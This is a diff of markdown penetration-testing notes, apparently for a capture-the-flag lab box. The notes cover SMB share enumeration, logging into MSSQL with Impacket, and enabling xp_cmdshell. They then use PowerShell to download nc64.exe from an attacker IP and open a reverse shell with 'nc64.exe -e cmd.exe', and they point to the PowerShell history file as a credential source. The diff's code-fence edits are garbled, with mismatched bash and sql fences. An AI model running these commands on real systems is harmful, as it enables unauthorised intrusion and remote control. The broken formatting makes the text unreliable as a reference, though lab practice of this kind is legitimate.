@@ -11,24 +11,22 @@ https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sh
 
 
 > Enumarate Smb Shares
-```
+```bash
 smbclient -N -L IP
-```
-```
+```bash
 use auxiliary/scanner/smb/smb_enumshares
-```
-
+```bash
 > Connect to Smb Share 
 ```
 smbclient //IP/smbsharename -N
-```
- 
+```bash
+```python
  > Impacket command:
  > 
-```
+```bash
 python3 mssqlclient.py ARCHETYPE/sql_svc@10.129.139.34 -windows-auth 
 ```
-
+```sql
 > sysadmin account from enumartion
 SELECT is_srvrolemember('sysadmin');
 
@@ -39,25 +37,23 @@ RECONFIGURE;
 sp_configure; - Enabling the sp_configure as stated in the above error message
 EXEC sp_configure 'xp_cmdshell', 1;
 RECONFIGURE;
-```
-
-```
+```bash
+```bash
 xp_cmdshell "whoami"
 ```
-
+```sql
 
 ```
 EXEC xp_cmdshell 'powershell -c "cd C:\Users\sql_svc\Downloads; Invoke-WebRequest -Uri http://10.10.15.73/nc64.exe -OutFile nc64.exe"';
-```
-
+```bash
+```sql
 Execute .exe payload:
-```
+```bash
 EXEC xp_cmdshell 'powershell -c "cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.15.73 443"';
 ```
-
+```sql
 
 >file from winpeas:
 ```
 C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
-```
-
+```bash
